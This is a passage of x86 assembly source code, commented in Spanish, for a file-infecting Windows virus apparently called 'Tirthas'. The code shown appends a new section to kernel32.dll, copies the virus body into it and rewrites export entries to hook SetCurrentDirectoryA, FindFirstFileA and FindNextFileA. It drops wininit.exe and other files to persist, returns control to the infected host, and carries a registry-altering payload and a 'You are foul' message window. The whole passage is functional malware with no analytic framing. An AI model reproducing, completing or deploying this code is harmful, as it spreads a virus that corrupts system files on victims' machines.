      add edi,78h                            ;EDI = Ultima seccion del kernel

      mov dword ptr [ebp+Address_Last_section],edi

      ;----------------------------------------------------------------------
      ; RELLENAR LA CABECERA DE LA NUEVA SECCION
      ;----------------------------------------------------------------------

      mov esi,dword ptr [edi+14h]
      mov ebx,dword ptr [edi+10h]
      add esi,ebx
    
      xor edx,edx
      mov edi,dword ptr [ebp+File_alignment]                       
      mov eax,esi
      div edi
      inc eax
      mul edi

      mov dword ptr [ebp+Pointer_to_raw_data],eax

      mov eax,dword ptr [ebp+Address_Last_section]

      mov esi,dword ptr [eax+0ch]
      mov ebx,dword ptr [eax+8h]
      add esi,ebx

      xor edx,edx
      mov edi,dword ptr [ebp+Section_alignment]           
      mov eax,esi
      div edi
      inc eax
      mul edi

      mov dword ptr [ebp+Virtual_address],eax

      xor edx,edx
      mov ecx,Tirthas_size
      add ecx,1000h
      mov edi,dword ptr [ebp+Section_alignment]                 
      mov eax,ecx
      div edi
      inc eax
      mul edi
     
      mov dword ptr [ebp+Virtual_size],eax

      mov edi,dword ptr [ebp+File_alignment]                 
      mov eax,ecx
      xor edx,edx
      div edi
      inc eax
      mul edi

      mov dword ptr [ebp+Size_of_raw_data],eax

      ;----------------------------------------------------------------------
      ; NUEVO SIZE OF IMAGE
      ;----------------------------------------------------------------------

      mov edi,dword ptr [ebp+Section_alignment]
      mov eax,dword ptr [ebp+Address_PEheader]

      xor edx,edx
      mov eax,dword ptr [eax+50h]
      add eax,ecx
      div edi
      inc eax
      mul edi
  
      mov ebx,dword ptr [ebp+Address_PEheader]
      mov dword ptr [ebx+50h],eax

      ;----------------------------------------------------------------------
      ; INCREMENTAR EL NUMERO DE SECCIONES
      ;----------------------------------------------------------------------

      mov ax,word ptr [ebx+6h]
      inc ax
      mov word ptr [ebx+6h],ax

      ;----------------------------------------------------------------------
      ; COPIAR LA CABECERA DE LA NUEVA SECCION
      ;----------------------------------------------------------------------

      mov edi,dword ptr [ebp+Address_Last_section]
      add edi,28h

      cld
      lea esi,[ebp+Tirthas_section]
      mov ecx,28h
      rep movsb

      ;----------------------------------------------------------------------
      ; INFECTAR EL KERNEL
      ;----------------------------------------------------------------------

      mov byte ptr [ebp+Flag_open_kernel],0

      cld
      lea esi,[ebp+Tirthas_start]
      mov ecx,Tirthas_size
      mov edi,dword ptr [ebp+Pointer_to_raw_data]
      add edi,dword ptr [ebp+Base_fichero]
      rep movsb

      mov byte ptr [ebp+Flag_open_kernel],1

      ;----------------------------------------------------------------------
      ; BUSQUEDA DE LA SECCION DE EXPORTACIONES
      ;----------------------------------------------------------------------

      mov eax,dword ptr [ebp+Address_PEheader]
      add eax,dword ptr [ebp+Size_optional_header]
      add eax,18h

 Search_E_data:

      cmp dword ptr [eax],'ade.'
      je E_data_header

      add eax,28h
      jmp Search_E_data

 E_data_header:

      mov edi,dword ptr [eax+14h]
      mov dword ptr [ebp+Pointer_to_raw_data_export],edi

      ;----------------------------------------------------------------------
      ; CALCULAR LA CONSTANTE DE SECCION
      ;----------------------------------------------------------------------

      mov ebx,dword ptr [eax+0ch]                     ;Virtual address
      sub ebx,edi
      mov dword ptr [ebp+Constante_seccion],ebx

      ;----------------------------------------------------------------------
      ; MODIFICAR LA SECCION DE EXPORTACIONES
      ;----------------------------------------------------------------------
      
      call calc_RVA

      mov eax,dword ptr [ebp+Pointer_to_raw_data_export]
      add eax,dword ptr [ebp+Base_fichero]          ;EAX = Edata

      mov eax,dword ptr [eax+1ch]
      add eax,dword ptr [ebp+Base_fichero]
      sub eax,dword ptr [ebp+Constante_seccion]     ;EAX = Address of fuction

      mov ecx,dword ptr [ebp+Ordinal_funcion_1]     ;Ordinal
      rol ecx,2
      add eax,ecx                                   ;Direccion de la RVA...

      mov edi,dword ptr [ebp+Datos_0]
      mov dword ptr [eax],edi                       ;Cambiamos el offset

      ;----------------------------------------------------------------------
      ; CIERRE DEL KERNEL
      ;----------------------------------------------------------------------

      jmp Close_mapping

 New_Wininit:

      mov byte ptr [ebp+Flag_open_kernel],0

      ;----------------------------------------------------------------------
      ; CREAR WININIT.EXE
      ;----------------------------------------------------------------------

      mov ecx,7BFh
      lea eax,[ebp+Windows_path]
      push eax
      call [ebp+A_SetCurrentDirectoryA]

 Create_wininit:

      push 0
      push 0
      push 2
      push 0
      push 1
      push 0c0000000h
      lea eax,[ebp+File_Wininit]
      push eax
      call [ebp+A_CreateFileA]

      inc eax
      je Generalt_exit
      dec eax

      mov dword ptr [ebp+Handle_wininit],eax

      lea esi,[ebp+Bytes_wininit]
      mov ecx,Wininit_size
      lea edx,[ebp+New_wininit_start]

      push 0
      push esi
      push ecx
      push edx
      push eax                                   
      call [ebp+A_WriteFile]

      push dword ptr [ebp+Handle_wininit]
      call [ebp+A_CloseHandle]

      ;----------------------------------------------------------------------
      ; CREAR WINSYSTEM.KER
      ;----------------------------------------------------------------------

      push 0
      push 0
      push 2
      push 0
      push 1
      push 0c0000000h
      lea eax,[ebp+File_System_addr]
      push eax
      call [ebp+A_CreateFileA]

      inc eax
      je Generalt_exit
      dec eax

      mov dword ptr [ebp+Handle_winsystem],eax

      lea esi,[ebp+Bytes_wininit]
      mov ecx,0c8h
      lea edx,[ebp+System_path]

      push 0
      push esi
      push ecx
      push edx
      push eax                                   
      call [ebp+A_WriteFile]

      push dword ptr [ebp+Handle_winsystem]
      call [ebp+A_CloseHandle]

      ;----------------------------------------------------------------------
      ; CREAR WININIT.INI
      ;----------------------------------------------------------------------

      push 0
      push 0
      push 2
      push 0
      push 1
      push 0c0000000h
      lea eax,[ebp+File_Wininit_ini]
      push eax
      call [ebp+A_CreateFileA]

      inc eax
      je Generalt_exit
      dec eax

      push eax
      call [ebp+A_CloseHandle]


      ;----------------------------------------------------------------------
      ; SALIDA
      ;----------------------------------------------------------------------

 Generalt_exit:

      cmp ebp,0
      je First_exit

      mov eax,dword ptr [ebp+Image_base]
      add eax,dword ptr [ebp+Old_entry_point]

      jmp eax

First_exit:

      push 0
      call [ebp+A_ExitProcess]

;----------------------------------------------------------------------------
; AREA DE DATOS
;----------------------------------------------------------------------------

 Tirthas_size              equ (offset Tirthas_end-offset Tirthas_start)
 SetCurrentDirectoryA_size equ (offset SetCurrentDirectoryA-offset Tirthas_start)
 Wininit_size            equ (offset New_wininit_end-offset New_wininit_start) 

      Base_kernel             dd  0
      Base_fichero            dd  0
      Handle_windows          dd  0
      Handle_find_files       dd  0
      Handle_createfile       dd  0
      Handle_createfilemap    dd  0
      Handle_kernel32         dd  0
      Handle_wininit          dd  0
      Handle_winsystem        dd  0
      Handle_wininit_ini      dd  0

      New_entry_point         dd  0
      Old_entry_point         dd  0 

      Number_section          dd  0
      Size_optional_header    dd  0
      Virtual_address_LS      dd  0
      Virtual_size_LS         dd  0
      Pointer_to_raw_data_LS  dd  0
      Address_Last_section    dd  0
      Section_alignment       dd  0
      File_alignment          dd  0
      Address_export_table    dd  0

      Old_SEH                 dd  0
      Bytes_wininit           dd  0

      Files_exe               db  '*.exe',0
      Files_cho               db  '*.cho',0
      Path_in_fuction         db  0c8h dup (0)
      File_Wininit            db  'wininit.exe',0
      File_Wininit_ini        db  'wininit.ini',0
      File_System_addr        db  'c:\winsys1.ker',0
      File_USER32             db  'user32.dll',0
      File_ADVAPI32           db  'advapi32.dll',0
      File_GDI32              db  'gdi32.dll',0
      Kernel32backup          db  'kernel32.dl_',0
      Kernel32                db  'Kernel32.dll',0

      System_path             db  0c8h dup (0)
      Windows_path            db  0c8h dup (0)

      Address_PEheader        dd  0
      Image_base              dd  0
      
      Numero_payload             db  0
      Flag_numero                db  0  ;--> Evita aumentar de tama¤o si el 
      Flag_funciones             db  0  ;    archivo no es apto.
      Flag_infection_by_fuction  db  0
      Flag_fuction_Find_File     db  0
      Flag_open_kernel           db  0

  ;--------------------------------------------------------------------------
  ; FUNCIONES INTERCEPTADAS
  ;--------------------------------------------------------------------------
      Return_address          dd  0
      Return_address_in_virus dd  0
      File_search             dd  0
      Struc_search            dd  0
      Handle_Find_next        dd  0

  ;--------------------------------------------------------------------------
  ; REGISTROS
  ;--------------------------------------------------------------------------
      EAX_seg  dd 0
      EBX_seg  dd 0
      ECX_seg  dd 0
      EDX_seg  dd 0
      ESI_seg  dd 0
      EDI_seg  dd 0
      EBP_seg  dd 0

  ;--------------------------------------------------------------------------
  ; REGISTRO DE WINDOWS
  ;--------------------------------------------------------------------------
      Clave_Accessibility db 'Control Panel\Accessibility\HighContrast',0
      Nombre_clave        db 'Enabled',0
      Handle_registro     dd 0
      Valor               db 1

  ;--------------------------------------------------------------------------
  ; ORDINALES DE LAS FUNCIONES PARCHEADAS
  ;--------------------------------------------------------------------------
      Ordinal_funcion_1 dd 0                ;SetCurrentDirectoryA
      Ordinal_funcion_2 dd 0                ;FindFirstFileA
      Ordinal_funcion_3 dd 0                ;FindNextFileA

  ;--------------------------------------------------------------------------
  ; NUEVA SECCION 
  ;--------------------------------------------------------------------------
  Tirthas_section:
      Name_section               db '.Tirthas'
      Virtual_size               dd 0
      Virtual_address            dd 0          
      Size_of_raw_data           dd 0
      Pointer_to_raw_data        dd 0
      Pointer_to_relocations     dd 0
      Pointer_to_line_numbers    dd 0
      Number_of_relocations      dw 0
      Number_of_line_numbers     dw 0
      Attributes_section         dd 0E0000020h

  ;--------------------------------------------------------------------------
  ; SECCION DE EXPORTACIONES
  ;--------------------------------------------------------------------------
      Constante_seccion          dd 0
      Pointer_to_raw_data_export dd 0

  ;--------------------------------------------------------------------------
  ; ULTIMA SECCION DEL KERNEL
  ;--------------------------------------------------------------------------
      Virtual_size_LS_K32            dd 0
      Virtual_address_LS_K32         dd 0          
      Size_of_raw_data_LS_K32        dd 0
      Pointer_to_raw_data_LS_K32     dd 0

  ;--------------------------------------------------------------------------
  ; GetProcAddress
  ;--------------------------------------------------------------------------
      T_GetProcAddress db  'GetProcAddress',0
      A_GetProcAddress dd  0                           

  ;--------------------------------------------------------------------------
  ;  API's necesarias:
  ;--------------------------------------------------------------------------
  ; KERNEL32.DLL
  ;--------------------------------------------------------------------------

  Fuction_list_1:                              
     T_ExitProcess            db   'ExitProcess',0            
     T_FindFirstFileA         db   'FindFirstFileA',0
     T_FindNextFileA          db   'FindNextFileA',0
     T_SetCurrentDirectoryA   db   'SetCurrentDirectoryA',0
     T_GetSystemTime          db   'GetSystemTime',0
     T_GetWindowsDirectory    db   'GetWindowsDirectoryA',0
     T_CreateFileA            db   'CreateFileA',0
     T_CloseHandle            db   'CloseHandle',0
     T_UnmapViewOfFile        db   'UnmapViewOfFile',0
     T_MapViewOfFile          db   'MapViewOfFile',0
     T_CreateFileMappingA     db   'CreateFileMappingA',0
     T_LoadLibraryA           db   'LoadLibraryA',0
     T_WriteFile              db   'WriteFile',0
     T_GetSystemDirectoryA    db   'GetSystemDirectoryA',0
     T_CreateThread           db   'CreateThread',0 
     T_CopyFileA              db   'CopyFileA',0
     T_WriteProcessMemory     db   'WriteProcessMemory',0
     T_GetCurrentProcess      db   'GetCurrentProcess',0
     T_VirtualProtect         db   'VirtualProtect',0

  ;--------------------------------------------------------------------------
  ;  API's necesarias:
  ;--------------------------------------------------------------------------
  ; ADVAPI32.DLL
  ;--------------------------------------------------------------------------

  Fuction_list_2:
     T_RegOpenKeyExA          db   'RegOpenKeyExA',0
     T_RegCloseKey            db   'RegCloseKey',0            
     T_RegSetValueExA         db   'RegSetValueExA',0
                                                              
  ;--------------------------------------------------------------------------
  ;  API's necesarias:
  ;--------------------------------------------------------------------------
  ; USER32.DLL
  ;--------------------------------------------------------------------------

  Fuction_list_3:
     T_MessageBoxA            db   'MessageBoxA',0
     T_RegisterClassA         db   'RegisterClassA',0
     T_CreateWindowExA        db   'CreateWindowExA',0
     T_ShowWindow             db   'ShowWindow',0
     T_GetDC                  db   'GetDC',0

  ;--------------------------------------------------------------------------
  ;  API's necesarias:
  ;--------------------------------------------------------------------------
  ; GDI32.DLL
  ;--------------------------------------------------------------------------

  Fuction_list_4:
     T_TextOutA               db   'TextOutA',0

  ;--------------------------------------------------------------------------
  ; DIRECCIONES DE LAS API'S
  ;--------------------------------------------------------------------------
  ; KERNEL32.DLL
  ;--------------------------------------------------------------------------

 Address_list_1:
     A_ExitProcess            dd   0           
     A_FindFirstFileA         dd   0
     A_FindNextFileA          dd   0
     A_SetCurrentDirectoryA   dd   0
     A_GetSystemTime          dd   0
     A_GetWindowsDirectory    dd   0
     A_CreateFileA            dd   0
     A_CloseHandle            dd   0
     A_UnmapViewOfFile        dd   0
     A_MapViewOfFile          dd   0
     A_CreateFileMappingA     dd   0
     A_LoadLibraryA           dd   0
     A_WriteFile              dd   0
     A_GetSystemDirectoryA    dd   0
     A_CreateThread           dd   0
     A_CopyFileA              dd   0
     A_WriteProcessMemory     dd   0
     A_GetCurrentProcess      dd   0
     A_VirtualProtect         dd   0

  ;--------------------------------------------------------------------------
  ; DIRECCIONES DE LAS API'S
  ;--------------------------------------------------------------------------
  ; ADVAPI32.DLL
  ;--------------------------------------------------------------------------

  Address_list_2:
     A_RegOpenKeyExA          dd   0
     A_RegCloseKey            dd   0          
     A_RegSetValueExA         dd   0

  ;--------------------------------------------------------------------------
  ; DIRECCIONES DE LAS API'S
  ;--------------------------------------------------------------------------
  ; USE32.DLL
  ;--------------------------------------------------------------------------

  Address_list_3:
     A_MessageBoxA            dd   0
     A_RegisterClassA         dd   0
     A_CreateWindowExA        dd   0
     A_ShowWindow             dd   0
     A_GetDC                  dd   0

  ;--------------------------------------------------------------------------
  ; DIRECCIONES DE LAS API'S
  ;--------------------------------------------------------------------------
  ; GDI32.DLL
  ;--------------------------------------------------------------------------

  Address_list_4:
     A_TextOutA               dd   0

  ;---------------------------------------------------------------------------
  ; ESTRUCTURAS
  ;---------------------------------------------------------------------------

Inftime               STRUC
        LowDate        DD ?
        HighDate       DD ?
Inftime               ENDS

Info_file label byte
     Attributes       dd 0
     CTime            Inftime ?
     LAccess          Inftime ?
     LWrite           Inftime ?
     FSizeH           dd 0
     FSizeL           dd 0
     Reservado1       dd 0
     Reservado2       dd 0
     FileName         db 104h DUP (0)
     Division         db 16   DUP (0)

date_system label byte
     Year             dw    0      
     Month            dw    0   
     DayOfWeek        dw    0   
     Day              dw    0 
     Hour             dw    0  
     Minute           dw    0
     Second           dw    0  
     Milliseconds     dw    0

Windows_class label byte
     Style            dd    1000h
     WndProc          dd    0
     ClsExtra         dd    0
     WndExtra         dd    0
     HandleInstance   dd    0         
     HandleIcon       dd    0        
     HandleCursor     dd    0         
     HbrBackground    dd    3      
     MenuName         dd    0        
     ClassName        dd    offset Name_class     

     Title_Windows    db    "Kernel32",0
     Name_class       db    "System32",0
     Texto            db    " You are foul ",0

Tirthas_end   label byte
end Tirthas
